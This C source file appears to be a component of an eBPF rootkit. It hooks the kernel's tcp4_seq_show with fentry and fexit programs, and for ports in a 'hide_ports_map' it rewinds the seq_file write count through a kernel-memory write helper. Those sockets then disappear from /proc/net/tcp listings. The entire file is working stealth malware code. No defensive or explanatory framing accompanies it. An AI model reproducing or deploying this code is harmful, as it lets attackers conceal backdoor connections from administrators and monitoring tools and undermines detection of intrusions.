#include <vmlinux.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "bpf/maps.h"

static long (*bpf_probe_write_kernel)(void *dst, const void *src, u32 size) = (void *) 116;

/* Temporary map to hold pre-execution m->count per task */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);   /* tgid_pid */
    __type(value, size_t); /* original m->count */
} seq_count_map SEC(".maps");

SEC("fentry/tcp4_seq_show")
int BPF_PROG(save_tcp4_seq_count, struct seq_file *m, void *v)
{
    /* Skip the header line (v == 1) */
    if (v == (void *)1)
        return 0;

    u64 pid_tgid = bpf_get_current_pid_tgid();
    size_t prev_count = BPF_CORE_READ(m, count);

    bpf_map_update_elem(&seq_count_map, &pid_tgid, &prev_count, BPF_ANY);
    return 0;
}

SEC("fexit/tcp4_seq_show")
int BPF_PROG(hide_tcp4_port, struct seq_file *m, void *v, int ret)
{
    if (v == (void *)1)
        return 0;

    u64 pid_tgid = bpf_get_current_pid_tgid();

    /* Lookup saved count */
    size_t *saved_count = bpf_map_lookup_elem(&seq_count_map, &pid_tgid);
    if (!saved_count)
        return 0;

    struct sock *sk = (struct sock *)v;
    u16 src_port = BPF_CORE_READ(sk, __sk_common.skc_num);

    /* Check if local port is hidden */
    u8 *hide = bpf_map_lookup_elem(&hide_ports_map, &src_port);
    if (hide && *hide == 1) {
        /* 
         * Rewind seq_file count back to pre-write state.
         * The next socket iteration will overwrite this buffer region.
         */
        size_t old_pos = *saved_count;
        bpf_probe_write_kernel(&m->count, &old_pos, sizeof(old_pos));
    }

    /* Clean up key from map */
    bpf_map_delete_elem(&seq_count_map, &pid_tgid);
    return 0;
}
